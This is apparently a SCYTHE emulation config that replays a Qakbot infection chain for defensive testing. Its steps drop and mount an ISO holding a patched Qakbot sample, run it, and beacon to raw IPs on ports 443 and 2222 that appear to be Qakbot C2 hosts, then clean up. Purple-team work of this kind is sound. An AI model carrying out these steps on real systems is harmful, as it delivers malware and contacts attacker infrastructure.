@@ -1,0 +1,138 @@
+{
+    "threat": {
+        "category": "User-Defined",
+        "description": "This version of qakbot uses an ISO where the user launches a .JS file, which in turn launches a powershell script. The PowerShell decodes a malicious DLL, writes it to disk with a .txt extension, and runs it with rundll32.exe. The ISO (or its components) may be signatured as malicious by endpoint protection products.",
+        "display_name": "Qakbot-2022-December",
+        "name": "Qakbot-2022-December",
+        "operating_system_name": "windows",
+        "script": {
+            "0": {
+                "conf": "{\"--cp\":\"127.0.0.1:443\",\"--multipart\":10240,\"--secure\":true}",
+                "module": "https",
+                "type": "initialization"
+            },
+            "1": {
+                "module": "loader",
+                "module_to_load": "downloader",
+                "request": "--load downloader",
+                "type": "message"
+            },
+            "2": {
+                "name": "MALWARE",
+                "type": "assign",
+                "value": "The ISO contains a DLL file encoded as a text file (peseta\\data.txt), a JS file, and a Powershell Script. The text file is an encoded Qakbot sample from 2022-11-28 (MD5: e9418a32d9191339800b07e816d1374a) that has been patched to put it into a tight loop (will consume a CPU core until terminated). Be advised that any of the files in the ISO could be signatured as malware by endpoint controls."
+            },
+            "3": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src \"VFS://shared/threats/Qakbot-2022-December/SCYTHE-AFL27.iso\" --dest \"%USERPROFILE%\\\\Downloads\\\\AFL27.iso\"",
+                "type": "message"
+            },
+            "4": {
+                "module": "loader",
+                "module_to_load": "run",
+                "request": "--load run",
+                "type": "message"
+            },
+            "5": {
+                "name": "MOUNT-IMAGE",
+                "type": "assign",
+                "value": "The user would double click on the ISO. Since we don't have a user, we'll use PowerShell. You probably should not perform detection engineering against this."
+            },
+            "6": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell.exe -command Mount-Diskimage -ImagePath \\\"%USERPROFILE%\\Downloads\\AFL27.iso\\\"",
+                "type": "message"
+            },
+            "7": {
+                "name": "DONOTSIGNATURE",
+                "type": "assign",
+                "value": "This program simulates the user clicking on the link by using ShellExecute and assigning the appropriate working directory."
+            },
+            "8": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src \"VFS://shared/threats/Qakbot-2022-December/click-icon.exe\" --dest \"%USERPROFILE%\\\\Desktop\\\\not-for-detections.exe\"",
+                "type": "message"
+            },
+            "9": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c %USERPROFILE%\\\\desktop\\\\not-for-detections.exe",
+                "type": "message"
+            },
+            "10": {
+                "module": "loader",
+                "module_to_load": "upsh",
+                "request": "--load upsh",
+                "type": "message"
+            },
+            "11": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd Invoke-Command -ScriptBlock { try { $response = Invoke-WebRequest -Uri https://www.broadcom.com -TimeoutSec 15 } catch { $_.Exception.Response.StatusCode.Value__ } }",
+                "type": "message"
+            },
+            "12": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd Invoke-Command -ScriptBlock { try { $response = Invoke-WebRequest -Uri https://108.162.6.34:443/t4 -TimeoutSec 15 } catch { $_.Exception.Response.StatusCode.Value__ } }",
+                "type": "message"
+            },
+            "13": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd Invoke-Command -ScriptBlock { try { $response = Invoke-WebRequest -Uri https://www.xfinity.com -TimeoutSec 15 } catch { $_.Exception.Response.StatusCode.Value__ } }",
+                "type": "message"
+            },
+            "14": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd Invoke-Command -ScriptBlock { try { $response = Invoke-WebRequest -Uri https://86.159.48.25:2222/t4 -TimeoutSec 15 } catch { $_.Exception.Response.StatusCode.Value__ } }",
+                "type": "message"
+            },
+            "15": {
+                "time": "60",
+                "type": "delay"
+            },
+            "16": {
+                "name": "CLEANUP",
+                "type": "assign",
+                "value": "These steps are to clean up SCYTHE generated files. Do not signature on these steps."
+            },
+            "17": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell.exe -command Dismount-Diskimage \\\"%USERPROFILE%\\Downloads\\AFL27.iso\\\"",
+                "type": "message"
+            },
+            "18": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c del \"%USERPROFILE%\\Downloads\\AFL27.iso\"",
+                "type": "message"
+            },
+            "19": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c del \"%USERPROFILE%\\Desktop\\not-for-detections.exe\"",
+                "type": "message"
+            },
+            "20": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell.exe \"$procs=Get-CimInstance -ClassName Win32_Process -Filter \\\"CommandLine LIKE '%test1.txt%'\\\";foreach ($proc in $procs){stop-process -id $proc.ProcessId }\"",
+                "type": "message"
+            },
+            "21": {
+                "depends_on": "8a328046-158f-4bce-bc3c-3c9b5b177512",
+                "module": "controller",
+                "request": "--shutdown",
+                "type": "message"
+            }
+        },
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29",
+        "tags": []
+    }
+}
